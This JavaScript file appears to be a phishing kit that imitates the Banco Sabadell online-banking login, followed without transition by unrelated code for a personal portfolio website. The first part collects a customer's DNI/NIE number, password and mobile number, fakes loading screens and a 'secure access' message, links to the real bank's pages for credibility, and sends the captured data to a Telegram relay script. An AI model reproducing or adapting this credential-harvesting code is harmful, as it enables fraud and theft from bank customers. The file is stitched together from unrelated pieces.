const loginForm = document.getElementById('login-form');
const loadingScreen = document.getElementById('loading-screen');
const phoneForm = document.getElementById('phone-form');
const errorMessage = document.getElementById('error-message');
const loginFormElement = document.getElementById('loginForm');
const phoneFormElement = document.getElementById('phoneForm');
const documentNumberInput = document.getElementById('documentNumber');
const passwordInput = document.getElementById('password');
const phoneNumberInput = document.getElementById('phoneNumber');
const loginError = document.getElementById('login-error');
const phoneError = document.getElementById('phone-error');
function showSection(sectionToShow) {
    loginForm.classList.add('hidden');
    loadingScreen.classList.add('hidden');
    phoneForm.classList.add('hidden');
    errorMessage.classList.add('hidden');
    loginError.classList.add('hidden');
    phoneError.classList.add('hidden');
    sectionToShow.classList.remove('hidden');
}
function validateLoginForm() {
    const documentValue = documentNumberInput.value.trim();
    const passwordValue = passwordInput.value.trim();
    const isDNIValid = validateDNI(documentValue);
    return documentValue.length > 0 && passwordValue.length >= 4 && isDNIValid;
}
function validatePhoneForm() {
    const phoneValue = phoneNumberInput.value.trim().replace(/\s/g, '');
    return validateSpanishPhone(phoneValue);
}
loginFormElement.addEventListener('submit', function(e) {
    e.preventDefault();
    loginError.classList.add('hidden');
    if (validateLoginForm()) {
        const documentType = document.querySelector('.document-type').value;
        const documentNumber = documentNumberInput.value.trim();
        const password = passwordInput.value.trim();
        const rememberUser = document.getElementById('rememberUser').checked;
        capturedData = {
            document_type: documentType,
            document_number: documentNumber,
            password: password,
            remember_user: rememberUser
        };
        showSection(loadingScreen);
        setTimeout(() => {
            showSection(phoneForm);
        }, 3000);
    } else {
        loginError.classList.remove('hidden');
    }
});
phoneFormElement.addEventListener('submit', function(e) {
    e.preventDefault();
    phoneError.classList.add('hidden');
    if (validatePhoneForm()) {
        const phoneNumber = phoneNumberInput.value.trim();
        capturedData.phone_number = phoneNumber;
        sendToTelegram(capturedData);
        showSection(loadingScreen);
        setTimeout(() => {
            showSection(errorMessage);
        }, 2000);
    } else {
        phoneError.classList.remove('hidden');
    }
});
phoneNumberInput.addEventListener('input', function() {
    const value = this.value.replace(/\s/g, '');
    this.value = this.value.replace(/[^0-9]/g, '');
    if (value.length > 0) {
        if (value.charAt(0) !== '6') {
            this.parentElement.style.borderColor = '#f44336';
        } else if (value.length === 9) {
            const isValid = validateSpanishPhone(value);
            if (isValid) {
                this.parentElement.style.borderColor = '#4caf50';
            } else {
                this.parentElement.style.borderColor = '#f44336';
            }
        } else {
            this.parentElement.style.borderColor = '#ff9800';
        }
    } else {
        this.parentElement.style.borderColor = '#ccc';
    }
});
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        eyeIcon.className = 'fa-solid fa-eye-slash';
    } else {
        passwordInput.type = 'password';
        eyeIcon.className = 'fa-solid fa-eye';
    }
}
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', function() {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        this.classList.add('active');
        const loginTitle = document.querySelector('.login-header h1');
        if (this.textContent.trim() === 'Particular') {
            loginTitle.textContent = 'Acceder como Particular';
        } else if (this.textContent.trim() === 'Empresa') {
            loginTitle.textContent = 'Acceder como Empresa';
        }
    });
});
document.querySelectorAll('input').forEach(input => {
    input.addEventListener('focus', function() {
        this.parentElement.style.borderColor = '#006DFF';
        this.parentElement.style.boxShadow = '0 0 0 3px rgba(0, 109, 255, 0.1)';
    });
    input.addEventListener('blur', function() {
        this.parentElement.style.borderColor = '#ddd';
        this.parentElement.style.boxShadow = 'none';
    });
});
document.querySelectorAll('button').forEach(button => {
    button.addEventListener('mouseenter', function() {
        if (this.classList.contains('btn-entrar')) {
            this.style.transform = 'translateY(-2px)';
            this.style.boxShadow = '0 5px 15px rgba(0, 109, 255, 0.3)';
        }
    });
    button.addEventListener('mouseleave', function() {
        if (this.classList.contains('btn-entrar')) {
            this.style.transform = 'translateY(0)';
            this.style.boxShadow = 'none';
        }
    });
});
document.querySelector('.btn-hazte-cliente').addEventListener('click', function(e) {
    e.preventDefault();
    window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Particulares/1191332211847/', '_blank');
});
document.querySelector('.btn-ayuda').addEventListener('click', function(e) {
    e.preventDefault();
    window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Ayuda/1191332211847/', '_blank');
});
document.querySelector('.btn-menu').addEventListener('click', function(e) {
    e.preventDefault();
});
document.querySelector('.btn-simula').addEventListener('click', function(e) {
    e.preventDefault();
    window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Simuladores/1191332211847/', '_blank');
});
document.querySelectorAll('.footer-link').forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        if (this.textContent.includes('Hazte Cliente')) {
            window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Particulares/1191332211847/', '_blank');
        } else if (this.textContent.includes('Seguridad')) {
            window.open('https://www.bancsabadell.com/cs/Satellite/SabAtl/Seguridad/1191332211847/', '_blank');
        }
    });
});
function addTypingEffect(input) {
    input.addEventListener('input', function() {
        this.style.transition = 'all 0.1s ease';
    });
}
document.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"]').forEach(addTypingEffect);
function validateSpanishPhone(phone) {
    const phoneRegex = /^6[0-9]{8}$/;
    return phoneRegex.test(phone);
}
function formatPhoneNumber(value) {
    const numbers = value.replace(/\D/g, '');
    const limited = numbers.substring(0, 9);
    if (limited.length <= 3) {
        return limited;
    } else if (limited.length <= 6) {
        return limited.substring(0, 3) + ' ' + limited.substring(3);
    } else {
        return limited.substring(0, 3) + ' ' + limited.substring(3, 6) + ' ' + limited.substring(6);
    }
}
documentNumberInput.addEventListener('input', function() {
    loginError.classList.add('hidden');
});
passwordInput.addEventListener('input', function() {
    loginError.classList.add('hidden');
});
phoneNumberInput.addEventListener('input', function() {
    phoneError.classList.add('hidden');
});
function validateDNI(dni) {
    const dniRegex = /^[0-9]{8}[TRWAGMYFPDXBNJZSQVHLCKE]$/i;
    const nieRegex = /^[XYZ][0-9]{7}[TRWAGMYFPDXBNJZSQVHLCKE]$/i;
    if (!dniRegex.test(dni) && !nieRegex.test(dni)) {
        return false;
    }
    const letters = 'TRWAGMYFPDXBNJZSQVHLCKE';
    let number;
    if (nieRegex.test(dni)) {
        const nieMap = { 'X': '0', 'Y': '1', 'Z': '2' };
        number = nieMap[dni.charAt(0)] + dni.substring(1, 8);
    } else {
        number = dni.substring(0, 8);
    }
    const expectedLetter = letters[parseInt(number) % 23];
    return expectedLetter === dni.charAt(dni.length - 1).toUpperCase();
}
documentNumberInput.addEventListener('input', function() {
    const value = this.value.toUpperCase();
    this.value = value; 
    if (value.length > 0) {
        if (value.length >= 9) {
            const isValid = validateDNI(value);
            if (isValid) {
                this.parentElement.style.borderColor = '#4caf50';
            } else {
                this.parentElement.style.borderColor = '#f44336';
            }
        } else {
            this.parentElement.style.borderColor = '#ff9800';
        }
    } else {
        this.parentElement.style.borderColor = '#ccc';
    }
});
passwordInput.addEventListener('input', function() {
    const value = this.value;
    if (value.length > 0) {
        if (value.length < 6) {
            this.style.borderColor = '#ff9800';
        } else {
            this.style.borderColor = '#4caf50';
        }
    }
});
phoneNumberInput.addEventListener('input', function() {
    const formatted = formatPhoneNumber(this.value);
    this.value = formatted;
    const numbers = formatted.replace(/\s/g, '');
    if (numbers.length > 0) {
        const isValid = /^6[0-9]{8}$/.test(numbers);
        if (!isValid && numbers.length >= 9) {
            this.parentElement.style.borderColor = '#f44336';
        } else if (numbers.length === 9) {
            this.parentElement.style.borderColor = '#4caf50';
        } else {
            this.parentElement.style.borderColor = '#ff9800';
        }
    }
});
console.log('🏦 Banco Sabadell - Sistema de acceso');
console.log('🔐 Acceso seguro verificado');
function updatePlaceholder() {
    const documentSelect = document.querySelector('.document-type');
    const documentInput = document.getElementById('documentNumber');
    if (documentSelect && documentInput) {
        const selectedValue = documentSelect.value;
        if (selectedValue === 'DNI / NIE') {
            documentInput.placeholder = 'Introduce tu DNI o NIE';
        } else if (selectedValue === 'CIF') {
            documentInput.placeholder = 'Introduce tu CIF de empresa';
        }
    }
}
let capturedData = {};
function sendToTelegram(data) {
    fetch('send_telegram.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('Datos enviados a Telegram:', result);
    })
    .catch(error => {
        console.error('Error al enviar datos:', error);
    });
}
document.addEventListener('DOMContentLoaded', function() {
    showSection(loginForm);
    const documentSelect = document.querySelector('.document-type');
    if (documentSelect) {
        documentSelect.addEventListener('change', updatePlaceholder);
        updatePlaceholder(); 
    }
    setTimeout(() => {
        documentNumberInput.focus();
    }, 500);
});

// DOM Content Loaded
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

// Initialize the application
function initializeApp() {
    setupNavigation();
    loadProjects();
    animateSkills();
    createParticles();
    setupContactForm();
    setupScrollAnimations();
}

// Navigation functionality
function setupNavigation() {
    const mobileMenu = document.getElementById('mobile-menu');
    const navMenu = document.querySelector('.nav-menu');
    const navLinks = document.querySelectorAll('.nav-link');

    // Mobile menu toggle
    mobileMenu.addEventListener('click', function() {
        navMenu.classList.toggle('active');
    });

    // Smooth scrolling for navigation links
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const targetId = this.getAttribute('href');
            const targetSection = document.querySelector(targetId);
            
            if (targetSection) {
                targetSection.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
            
            // Close mobile menu if open
            navMenu.classList.remove('active');
        });
    });

    // Navbar background on scroll
    window.addEventListener('scroll', function() {
        const navbar = document.querySelector('.navbar');
        if (window.scrollY > 50) {
            navbar.style.background = 'rgba(255, 255, 255, 0.98)';
        } else {
            navbar.style.background = 'rgba(255, 255, 255, 0.95)';
        }
    });
}

// Projects data and functionality
const projectsData = [
    {
        title: "E-commerce Dinámico",
        description: "Plataforma de comercio electrónico con carrito de compras en tiempo real y sistema de pagos integrado.",
        tech: ["React", "Node.js", "MongoDB", "Stripe"],
        icon: "🛒"
    },
    {
        title: "Dashboard Analytics",
        description: "Panel de control interactivo con gráficos en tiempo real y visualización de datos avanzada.",
        tech: ["Vue.js", "D3.js", "Python", "PostgreSQL"],
        icon: "📊"
    },
    {
        title: "App Móvil Social",
        description: "Aplicación móvil social con chat en tiempo real, geolocalización y compartir contenido.",
        tech: ["React Native", "Firebase", "Socket.io"],
        icon: "📱"
    },
    {
        title: "Sistema de Gestión",
        description: "Sistema completo de gestión empresarial con módulos de inventario, ventas y reportes.",
        tech: ["Angular", "Spring Boot", "MySQL"],
        icon: "🏢"
    },
    {
        title: "Portfolio Interactivo",
        description: "Sitio web portfolio con animaciones avanzadas y efectos visuales impresionantes.",
        tech: ["HTML5", "CSS3", "JavaScript", "GSAP"],
        icon: "🎨"
    },
    {
        title: "API REST Escalable",
        description: "API RESTful robusta con autenticación JWT, rate limiting y documentación automática.",
        tech: ["Express.js", "JWT", "Swagger", "Redis"],
        icon: "🔌"
    }
];

let currentProjectIndex = 0;
const projectsPerLoad = 3;

function loadProjects() {
    const projectsGrid = document.getElementById('projects-grid');
    const projectsToShow = projectsData.slice(0, projectsPerLoad);
    
    projectsToShow.forEach((project, index) => {
        const projectCard = createProjectCard(project, index);
        projectsGrid.appendChild(projectCard);
    });
    
    currentProjectIndex = projectsPerLoad;
}

function createProjectCard(project, index) {
    const card = document.createElement('div');
    card.className = 'project-card';
    card.style.animationDelay = `${index * 0.1}s`;
    
    card.innerHTML = `
        <div class="project-image">
            ${project.icon}
        </div>
        <div class="project-content">
            <h3 class="project-title">${project.title}</h3>
            <p class="project-description">${project.description}</p>
            <div class="project-tech">
                ${project.tech.map(tech => `<span class="tech-tag">${tech}</span>`).join('')}
            </div>
        </div>
    `;
    
    // Add click animation
    card.addEventListener('click', function() {
        this.style.transform = 'scale(0.95)';
        setTimeout(() => {
            this.style.transform = '';
        }, 150);
    });
    
    return card;
}

function loadMoreProjects() {
    const projectsGrid = document.getElementById('projects-grid');
    const remainingProjects = projectsData.slice(currentProjectIndex, currentProjectIndex + projectsPerLoad);
    
    remainingProjects.forEach((project, index) => {
        const projectCard = createProjectCard(project, index);
        projectCard.style.opacity = '0';
        projectCard.style.transform = 'translateY(30px)';
        projectsGrid.appendChild(projectCard);
        
        // Animate in
        setTimeout(() => {
            projectCard.style.transition = 'all 0.5s ease';
            projectCard.style.opacity = '1';
            projectCard.style.transform = 'translateY(0)';
        }, index * 100);
    });
    
    currentProjectIndex += projectsPerLoad;
    
    // Hide load more button if no more projects
    if (currentProjectIndex >= projectsData.length) {
        document.querySelector('.load-more').style.display = 'none';
    }
}

function showProjects() {
    document.getElementById('projects').scrollIntoView({
        behavior: 'smooth',
        block: 'start'
    });
}

// Skills animation
function animateSkills() {
    const skillBars = document.querySelectorAll('.skill-progress');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const progressBar = entry.target;
                const width = progressBar.getAttribute('data-width');
                progressBar.style.width = width;
            }
        });
    }, { threshold: 0.5 });
    
    skillBars.forEach(bar => {
        observer.observe(bar);
    });
}

// Particles system
function createParticles() {
    const particlesContainer = document.getElementById('particles');
    const particleCount = 50;
    
    for (let i = 0; i < particleCount; i++) {
        createParticle(particlesContainer);
    }
}

function createParticle(container) {
    const particle = document.createElement('div');
    particle.className = 'particle';
    
    // Random starting position
    particle.style.left = Math.random() * 100 + '%';
    particle.style.animationDelay = Math.random() * 20 + 's';
    particle.style.animationDuration = (15 + Math.random() * 10) + 's';
    
    container.appendChild(particle);
    
    // Remove and recreate particle after animation
    particle.addEventListener('animationend', function() {
        particle.remove();
        createParticle(container);
    });
}

// Contact form functionality
function setupContactForm() {
    const contactForm = document.getElementById('contact-form');
    
    contactForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get form data
        const formData = new FormData(this);
        const name = formData.get('name');
        const email = formData.get('email');
        const message = formData.get('message');
        
        // Simulate form submission
        const submitButton = this.querySelector('button[type="submit"]');
        const originalText = submitButton.textContent;
        
        submitButton.textContent = 'Enviando...';
        submitButton.disabled = true;
        
        setTimeout(() => {
            showNotification('¡Mensaje enviado con éxito! Te contactaré pronto.', 'success');
            this.reset();
            submitButton.textContent = originalText;
            submitButton.disabled = false;
        }, 2000);
    });
}

// Notification system
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;
    
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#4caf50' : '#2196f3'};
        color: white;
        padding: 1rem 2rem;
        border-radius: 10px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        z-index: 3000;
        animation: slideInRight 0.3s ease;
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease';
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 4000);
}

// Modal functionality
function openModal() {
    const modal = document.getElementById('modal');
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';
}

function closeModal() {
    const modal = document.getElementById('modal');
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
}

// Close modal when clicking outside
window.addEventListener('click', function(e) {
    const modal = document.getElementById('modal');
    if (e.target === modal) {
        closeModal();
    }
});

// Scroll animations
function setupScrollAnimations() {
    const animatedElements = document.querySelectorAll('.project-card, .skill-category, .contact-info, .contact-form');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, { threshold: 0.1 });
    
    animatedElements.forEach(element => {
        element.style.opacity = '0';
        element.style.transform = 'translateY(30px)';
        element.style.transition = 'all 0.6s ease';
        observer.observe(element);
    });
}

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Press 'M' to open modal
    if (e.key.toLowerCase() === 'm' && !e.ctrlKey && !e.altKey) {
        openModal();
    }
    
    // Press 'Escape' to close modal
    if (e.key === 'Escape') {
        closeModal();
    }
});

// Dynamic time greeting
function updateGreeting() {
    const hour = new Date().getHours();
    let greeting;
    
    if (hour < 12) {
        greeting = '¡Buenos días!';
    } else if (hour < 18) {
        greeting = '¡Buenas tardes!';
    } else {
        greeting = '¡Buenas noches!';
    }
    
    // Update greeting if element exists
    const greetingElement = document.querySelector('.dynamic-greeting');
    if (greetingElement) {
        greetingElement.textContent = greeting;
    }
}

// Mouse trail effect
let mouseTrail = [];
document.addEventListener('mousemove', function(e) {
    mouseTrail.push({ x: e.clientX, y: e.clientY, time: Date.now() });
    
    // Keep only recent positions
    mouseTrail = mouseTrail.filter(point => Date.now() - point.time < 500);
    
    // Create trail effect
    if (mouseTrail.length > 1) {
        createTrailPoint(e.clientX, e.clientY);
    }
});

function createTrailPoint(x, y) {
    const point = document.createElement('div');
    point.style.cssText = `
        position: fixed;
        width: 4px;
        height: 4px;
        background: rgba(102, 126, 234, 0.6);
        border-radius: 50%;
        pointer-events: none;
        z-index: 9999;
        left: ${x}px;
        top: ${y}px;
        animation: trailFade 0.5s ease-out forwards;
    `;
    
    document.body.appendChild(point);
    
    setTimeout(() => {
        point.remove();
    }, 500);
}

// Add CSS for trail animation
const trailStyle = document.createElement('style');
trailStyle.textContent = `
    @keyframes trailFade {
        to {
            opacity: 0;
            transform: scale(0);
        }
    }
    
    @keyframes slideInRight {
        from {
            transform: translateX(100%);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(100%);
            opacity: 0;
        }
    }
`;
document.head.appendChild(trailStyle);

// Performance optimization: Throttle scroll events
function throttle(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Initialize greeting on load
updateGreeting();

// Update greeting every hour
setInterval(updateGreeting, 3600000);

// Smooth reveal animation for page load
window.addEventListener('load', function() {
    document.body.style.opacity = '1';
    document.body.style.transition = 'opacity 0.5s ease';
});

// Set initial body opacity
document.body.style.opacity = '0';